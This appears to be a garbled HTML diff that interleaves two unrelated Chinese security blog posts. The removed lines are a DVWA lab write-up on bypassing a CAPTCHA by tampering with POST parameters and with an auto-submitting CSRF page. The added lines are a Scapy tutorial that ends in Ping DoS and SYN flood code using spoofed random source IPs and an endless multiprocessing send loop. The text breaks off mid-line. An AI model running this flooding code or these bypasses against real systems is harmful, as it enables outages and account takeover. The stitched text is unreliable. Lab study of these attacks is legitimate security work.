+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pkt = IP()/TCP()</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>recaptcha_check_answer(string: $privkey, string: $remoteip, string: $challenge, string: $response, array: $extra_params = array())</p>
+<p><font color="red">注意</font>：<code>IP()</code>一定在<code>TCP()</code>之前。</p>
+<p><code>IP()</code>参数解析</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>version</td>
+<td>版本</td>
+<td>4</td>
+</tr>
+<tr>
+<td>ihl</td>
+<td>报头长度</td>
+<td>None</td>
+</tr>
+<tr>
+<td>tos</td>
+<td>服务类型</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>len</td>
+<td>报文总长度</td>
+<td>None</td>
+</tr>
+<tr>
+<td>id</td>
+<td>标识符</td>
+<td>1</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>标记</td>
+<td>NULL</td>
+</tr>
+<tr>
+<td>frag</td>
+<td>段偏移</td>
+<td>0</td>
+</tr>
+<tr>
+<td>ttl</td>
+<td>生存周期</td>
+<td>64</td>
+</tr>
+<tr>
+<td>proto</td>
+<td>协议</td>
+<td>tcp</td>
+</tr>
+<tr>
+<td>chksum</td>
+<td>校验和</td>
+<td>None</td>
+</tr>
+<tr>
+<td>src</td>
+<td>源<code>IP</code>地址</td>
+<td>127.0.0.1</td>
+</tr>
+<tr>
+<td>dst</td>
+<td>目的<code>IP</code>地址</td>
+<td>127.0.0.1</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p><code>TCP()</code>参数解析</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sport</td>
+<td>源端口</td>
+<td>ftp_data</td>
+</tr>
+<tr>
+<td>dport</td>
+<td>目的端口</td>
+<td>http</td>
+</tr>
+<tr>
+<td>seq</td>
+<td>序号</td>
+<td>0</td>
+</tr>
+<tr>
+<td>ack</td>
+<td>确认号</td>
+<td>0</td>
+</tr>
+<tr>
+<td>dataofs</td>
+<td>数据偏移</td>
+<td>None</td>
+</tr>
+<tr>
+<td>reserved</td>
+<td>保留位</td>
+<td>0</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>控制功能</td>
+<td>S</td>
+</tr>
+<tr>
+<td>window</td>
+<td>窗口大小</td>
+<td>8192</td>
+</tr>
+<tr>
+<td>chksum</td>
+<td>校验和</td>
+<td>None</td>
+</tr>
+<tr>
+<td>urgptr</td>
+<td>紧急指针</td>
+<td>0</td>
+</tr>
+<tr>
+<td>options</td>
+<td>选项</td>
+<td>[]</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>根据需求设置数据包之后，使用<code>&#123;PKT_NAME&#125;.show()</code>可以查看报文信息。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 192.168.239.128</span><br><span class="line">  dst= 110.242.68.4</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= http</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= S</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br></pre></td></tr></table></figure>
+<h2 id="包发送"><a href="#包发送" class="headerlink" title="包发送"></a>包发送</h2><ul>
+<li>使用<code>send()</code>函数发送数据包，该函数不返回响应。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>sendp()</code>等加了<code>p</code>的函数作用于第二层，发送的是帧。</p>
 </blockquote>
 <ul>
-<li><p>可以利用服务器核对验证信息这个环节，绕过<code>CAPTCHA</code>验证，完成非人类请求。</p>
-<span id="more"></span>
-</li>
+<li><code>sr()</code>和<code>sr1()</code>发送数据包并接收响应。</li>
 </ul>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><ul>
-<li>这里使用<code>DVWA</code>靶场完成对攻击场景的模拟。</li>
-<li>由于<code>Burp Suite</code>的代理和梯子冲突，故不打开梯子，<code>reCAPTCHA</code>无法显示(会使用方法绕过，此处不影响)。</li>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; res, unans = sr(pkt)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt;&gt;&gt; res</span><br><span class="line">&lt;Results: TCP:1 UDP:0 ICMP:0 Other:0&gt;</span><br><span class="line">&gt;&gt;&gt; unans</span><br><span class="line">&lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>sr()</code>和<code>sr1()</code>的区别在于，<code>sr1()</code>只有一个返回值（<code>Results</code>）。</p>
+</blockquote>
+<h2 id="Ping-DoS"><a href="#Ping-DoS" class="headerlink" title="Ping DoS"></a>Ping DoS</h2><ul>
+<li>使用<code>Ping</code>进行<code>DoS</code>攻击时，由于<code>Ping</code>使用的是<code>ICMP</code>协议，下面给出<code>ICMP()</code>的参数解析。</li>
 </ul>
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><ul>
-<li>这里修改密码的过程有两步，第一步是<code>CAPTCHA</code>的验证环节，第二步是将参数<code>POST</code>到后台。</li>
-<li>由于两步操作的判断是完全分开、没有联系的，于是可以忽略第一步的验证，直接提交修改申请。</li>
-<li>两个步骤对应的<code>step</code>参数不同，可以通过抓取报文并且修改<code>step</code>，来实现验证的绕过。</li>
-<li>代码没有对<code>CSRF</code>进行任何防护，可以利用<code>CSRF</code>漏洞进行攻击。</li>
-</ul>
-<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
-<li>不进行验证，直接输入对密码的修改。</li>
-<li>点击<code>change</code>后，<code>step</code>本应提交为<code>1</code>，此处进行抓包修改。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210123120544319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
-<li>修改之后则绕过了验证阶段，直接进行密码修改。</li>
-<li>第二种方法，同<code>CSRF</code>攻击一样，构造攻击页面。</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.getElementById(&#x27;transfer&#x27;).submit()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/DVWA-master/vulnerabilities/captcha/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;step&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>ICMP()</code>参数解析</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>消息类型</td>
+<td>echo-request</td>
+</tr>
+<tr>
+<td>code</td>
+<td>代码</td>
+<td>0</td>
+</tr>
+<tr>
+<td>chksum</td>
+<td>校验和</td>
+<td>None</td>
+</tr>
+<tr>
+<td>id</td>
+<td>标识</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>seq</td>
+<td>序号</td>
+<td>0x0</td>
+</tr>
+</tbody>
+</table>
+</div>
 <ul>
-<li>用户点击攻击页面后自动提交请求，并跳转到修改密码的初始页面。</li>
+<li><code>Ping</code>攻击报文的设置比较简单，通过随机配置<code>ICMP()</code>也能实现<code>Ping DoS</code>的攻击效果。</li>
+<li>结合<code>IP()</code>设置目标主机<code>IP</code>。</li>
 </ul>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Same as Low</span></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="comment">// Check to see if they did stage 1</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">    <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<h3 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a>审计</h3><ul>
-<li><code>Medium</code>级别基于<code>Low</code>的基础，在第二步判断增加了对第一步是否通过的验证，即判断参数<code>passed_captcha</code>是否为真。</li>
-<li><code>passed_captcha</code>参数是通过<code>POST</code>提交的，整个请求也是<code>POST</code>请求，故可以人为加上此参数。</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#判断是否随机源</span></span><br><span class="line"><span class="keyword">if</span> random_source ==<span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#随机构造IP</span></span><br><span class="line">    source_ip = Random_IP()</span><br><span class="line"></span><br><span class="line">    ip_proto = IP(src = source_ip,</span><br><span class="line">                  dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip_proto = IP(dst = host,</span><br><span class="line">                  ttl = <span class="number">1</span>,</span><br><span class="line">                  <span class="built_in">id</span> = id_ip)</span><br><span class="line">	<span class="comment">#id_ping和seq_ping均为随机配置</span></span><br><span class="line">    icmp_proto = ICMP(<span class="built_in">id</span> = id_ping,</span><br><span class="line">                      seq = seq_ping)</span><br><span class="line">    <span class="comment">#设置数据内容</span></span><br><span class="line">    data = <span class="string">b&#x27;ping dos&#x27;</span></span><br><span class="line">	</span><br><span class="line">    pkt = ip_proto / icmp_proto / data *<span class="number">100</span></span><br><span class="line">    send(pkt)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在这基础上，要想达到效果，我们需要增加攻击报文的量。</li>
+<li>通过循环重复攻击之外，我们采用多进程并发的方式增大攻击频率。</li>
 </ul>
-<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ul>
-<li>同<code>Low</code>一样，直接跳过验证环节，提交请求。</li>
-<li>使用<code>Burp Suite</code>抓取包并修改报文，将步骤直接调整到第二步，第二步的验证伪造为已验证，即直接加入<code>passed_captcha</code>参数，混入<code>POST</code>的参数提交。</li>
-<li><img src="https://img-blog.csdnimg.cn/20210123120622846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
-<li><code>Forward</code>提交请求，发现完成绕过。</li>
-<li>利用<code>CSRF</code>漏洞攻击时，攻击页面需要添加一条参数提交。</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#processes设置太高会影响本机运作，太低起不到干扰效果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping_concurrent</span>(<span class="params">host, processes=<span class="number">5</span>, random_source=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="comment">#创建进程池</span></span><br><span class="line">    pool = multiprocessing.Pool(processes=processes)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#选择进程的任务和参数</span></span><br><span class="line">            pool.apply_async(ping_times, (host, random_source))</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            pool.terminate()</span><br></pre></td></tr></table></figure>
+<h2 id="SYN-Flood"><a href="#SYN-Flood" class="headerlink" title="SYN_Flood"></a>SYN_Flood</h2><ul>
+<li>多进程和重复次数的性质和<code>Ping DoS</code>一致，这里主要的区别在于把<code>ICMP</code>协议换成了<code>TCP</code>协议。</li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passed_captcha&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Same as Medium</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="variable">$resp</span> || </span><br><span class="line">        (</span><br><span class="line">            <span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="审计-2"><a href="#审计-2" class="headerlink" title="审计"></a>审计</h3><ul>
-<li><code>High</code>级别将验证流程合并，通过连续的判断将两个步骤相同的部分合并，避免了第一步验证的直接改参绕过。</li>
-<li>加入了<code>token</code>机制，有效防止<code>CSRF</code>漏洞攻击，下面不再做攻击页面。</li>
-</ul>
-<h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><ul>
-<li>看到了后端代码，发现即使不验证也有机会绕过验证，于是针对<code>g-recaptcha-response</code>和<code>HTTP_USER_AGENT</code>操作。</li>
-<li>同样不验证，直接提交请求并对相关参数进行抓包修改。</li>
-<li><img src="https://img-blog.csdnimg.cn/2021012312065438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTY5MDYy,size_16,color_FFFFFF,t_70" alt=""></li>
-<li>提交后，参数完成了伪造绕过。</li>
-</ul>
-<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul>
-<li>使用<code>Impossible</code>级别代码作为防御模板。</li>
-</ul>
-<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span>  = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_conf</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span 